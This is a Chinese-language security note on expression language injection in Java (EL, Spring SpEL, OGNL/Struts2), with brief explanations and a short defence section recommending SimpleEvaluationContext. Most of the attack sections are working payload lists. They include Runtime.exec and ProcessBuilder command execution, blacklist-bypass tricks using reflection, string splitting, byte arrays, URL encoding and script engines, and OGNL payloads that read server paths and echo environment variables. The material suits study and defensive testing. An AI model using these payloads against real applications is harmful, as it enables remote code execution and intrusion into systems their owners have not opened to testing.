OGNL(struts2)、SpEL(spring)、MVEL、EL、Fel、JSTL+EL等
# **EL表达式**
原生EL（Expression Language）表达式 是为了使JSP写起来更加简单。
```
//执行命令
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()")}
```


^
# **Spring的SpEL表达式**
功能：
```
把字符串当做代码执行。
数学表达式执行。
配置文件解析：SpEL可以解析配置文件中的动态值，引用其他属性或方法的值，实现配置的动态性。
SpEL通常用在Spring框架的某些特定场景中，比如
在配置文件中通过`${...}`使用属性占位符，或者在注解中实现复杂的逻辑，例如`@Conditional`注解。
```

集成：
存在Spel注入的前提是存在SpEl相关的库，如下是相关的库
```
当集成的spring-boot-starter-web依赖后，就可以自动使用。
org.springframework.expression.spel.standard
SpelExpressionParser
parseExpression
expression.getValue();
expression.setValue();
```
SpEl解析SpEL提供了两套不同的接口，分别是"SimpleEvaluationContext"和"StandardEvaluationContext"。
"SimpleEvaluationContext" 仅支持简单的表达式，抛弃了Java类型引用，构造函数，相较比较安全。
而"StandardEvaluationContext" 支持复杂的表达式，如方法调用、属性访问等。 
如果在不指定EvaluationContext的情况下，SpEl默认使用"StandardEvaluationContext"。

关键词：StandardEvaluationContext()；

^
## **使用**
SpEL的用法有三种形式
1、是在注解@Value中；
2、是XML配置；
3、在代码中使用Expression。
```
SpEL使用#{}作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。
#{}就是SpEL的定界符，用于指明内容未SpEL表达式并执行；
${}主要用于加载外部属性文件中的值；
两者可以混合使用，但是必须#{}在外面，${}在里面，如#{'${}'}，注意单引号是字符串类型才添加的；
```
```
在SpEL表达式中，使用T(Type)运算符会调用类的作用域和方法。
使用T(Type)来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。
T(Runtime).getRuntime().exec('calc')
```

案例：
```
String spel ="T(java.lang.Runtime).getRuntime().exec(\"calc\")"; 
//T()包裹后可以直接调用静态方法和静态属性。
ExpressionParser parser=new SpelExpressionParser();
Expression expression=parser.parseExpression(spel);
EvaluationContext context=new StandardEvaluationContext();
expression.getValue(context);

```

CVE复现：<https://cloud.tencent.com/developer/article/2144995>
实战案例：<https://github.com/datageartech/datagear/issues/32>



^
### **SpEL表达式 #{} 和 {} 和 # 的使用用法**
1. #{} 表达式
   #{} 用于在 Spring 配置文件中表示需要解析的 SpEL 表达式。主要用于注解、XML 配置和属性文件中，通常在需要动态计算的场景下使用。
```java 
@Value("#{systemProperties['user.home']}")
private String userHome;
```
2. `#` 符号   
`#` 符号在 SpEL 表达式中用于引用变量或方法。通常在解析上下文中使用，以引用方法、属性或在表达式中定义的变量。
```java 
SpelExpressionParser parser = new SpelExpressionParser();
StandardEvaluationContext context = new StandardEvaluationContext();
context.setVariable("number", 42);

Integer number = parser.parseExpression("#number").getValue(context, Integer.class);
```
3. ` '' `字符串  
   用于在 SpEL 表达式中表示字符串文字。字符串文字在 SpEL 表达式中必须用单引号括起来，以区分其他类型的值（如数字、变量等）。
```java 
SpelExpressionParser parser = new SpelExpressionParser();
String result = parser.parseExpression("'Hello ' + 'World'").getValue(String.class);
```



 
^
## **SpEL表达式注入payload**
```
// 执行exec
T(java.lang.Runtime).getRuntime().exec("calc.exe");
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc.exe");

 ```
```
T(java.lang.Ru" + "ntime).getRuntime().exec('calc');

String spel = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[]))" +".invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")" +".getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass()" +".forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"cmd\",\"/C\",\"calc\"})\n";

new javax.script.ScriptEngineManager().getEngineByName("javascript").eval("java.lang.Runtime.getRuntime().exec('calc')")";

T(java.lang.Runtime).getRuntime().exec("calc")
T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x6c,0x63}))
```
更多
```
// PoC原型

// Runtime
T(java.lang.Runtime).getRuntime().exec("calc")
T(Runtime).getRuntime().exec("calc")

// ProcessBuilder
new java.lang.ProcessBuilder({'calc'}).start()
new ProcessBuilder({'calc'}).start()

******************************************************************************
// Bypass技巧

// 反射调用
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
#{T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('calc')}

// 同上，需要有上下文环境
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")

// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})

// 同上，需要有上下文环境
#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})

// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1
// byte数组内容的生成后面有脚本
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()

// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2
// byte数组内容的生成后面有脚本
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))

// JavaScript引擎通用PoC
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")

T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)

// JavaScript引擎+反射调用
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)

// JavaScript引擎+URL编码
// 其中URL编码内容为：
// 不加最后的getInputStream()也行，因为弹计算器不需要回显
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)

// 黑名单过滤".getClass("，可利用数组的方式绕过，还未测试成功
''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')

// JDK9新增的shell，还未测试
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```

## **SpEL表达式注入防御**
使用 SimpleEvaluationContext
防御：使用时做白名单，只有需要的字符串才能当作代码执行。
```java
SpelExpressionParser parser = new SpelExpressionParser();
SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
expression.setValue(context, "payload");
```



^
# **OGNL(struts2)表达式注入**
记录POC，具体的内容学structs。

具体参考
<https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x01-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80>
```
%{2+2}

// 获取tomcat路径
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}

// 获取web路径
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}

// 命令执行 env，flag就在其中
password=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}&username=1




//获取context里面的变量
 #user
 #user.name

//使用runtime执行系统命令
@java.lang.Runtime@getRuntime().exec("calc")


//使用processbuilder执行系统命令
(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()

//获取当前路径
@java.lang.System@getProperty("user.dir")
```

